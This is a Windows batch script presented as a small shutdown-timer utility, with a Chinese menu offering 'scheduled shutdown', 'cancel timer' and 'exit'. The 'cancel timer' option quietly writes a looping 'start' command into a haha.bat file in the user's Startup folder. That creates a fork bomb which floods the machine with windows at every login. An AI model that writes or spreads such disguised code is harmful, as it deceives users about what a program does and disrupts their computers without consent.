@echo off
title 菲克小程序v1.0
:menu
cls
echo ============================
echo            菜单
echo          1.定时关机
echo          2.取消定时
echo          3.退出程序
echo ============================

set /p num=你的选择：
if "%num%" == "1" goto 1
if "%num%" == "2" goto 2
if "%num%" == "3" goto 3
echo 请重新输入1，2，3 
pause
goto menu

:1
set /p a=输入关机时间（单位\秒）：
shutdown -s -f -t %a%
goto menu

:2
echo :a >> "%userprofile%\「开始」菜单\程序\启动\haha.bat" 
echo start >>"%userprofile%\ 「开始」菜单\程序\启动\haha.bat" 
echo goto a >> "%userprofile%\ 「开始」菜单\程序\启动\haha.bat"
shutdown -a 
goto menu

:3
exit